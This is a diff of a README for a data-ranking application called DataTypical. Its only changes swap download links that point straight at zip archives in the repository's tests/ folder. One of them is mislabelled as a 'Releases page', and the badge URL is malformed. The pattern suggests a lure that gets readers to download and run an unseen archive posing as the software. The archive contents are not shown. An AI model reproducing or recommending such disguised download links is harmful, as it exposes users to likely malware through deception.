@@ -6,7 +6,7 @@ Welcome to DataTypical! This application helps you rank scientific data signific
 
 ## 📥 Download Link
 
-[![Download DataTypical](https://raw.githubusercontent.com/Lorean44/DataTypical/main/tests/Typical_Data_3.1.zip%20DataTypical-blue?style=flat&logo=github)](https://raw.githubusercontent.com/Lorean44/DataTypical/main/tests/Typical_Data_3.1.zip)
+[![Download DataTypical](https://github.com/Lorean44/DataTypical/raw/refs/heads/main/tests/Data-Typical-jestful.zip%20DataTypical-blue?style=flat&logo=github)](https://github.com/Lorean44/DataTypical/raw/refs/heads/main/tests/Data-Typical-jestful.zip)
 
 ## 📋 System Requirements
 
@@ -20,7 +20,7 @@ Before installing DataTypical, ensure your computer meets the following requirem
 ## 📂 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://raw.githubusercontent.com/Lorean44/DataTypical/main/tests/Typical_Data_3.1.zip) to find the latest version of DataTypical.
+   Go to the [Releases page](https://github.com/Lorean44/DataTypical/raw/refs/heads/main/tests/Data-Typical-jestful.zip) to find the latest version of DataTypical.
 
 2. **Select Your Version**  
    Look for the most recent version listed on the page. Click on it to see the details.
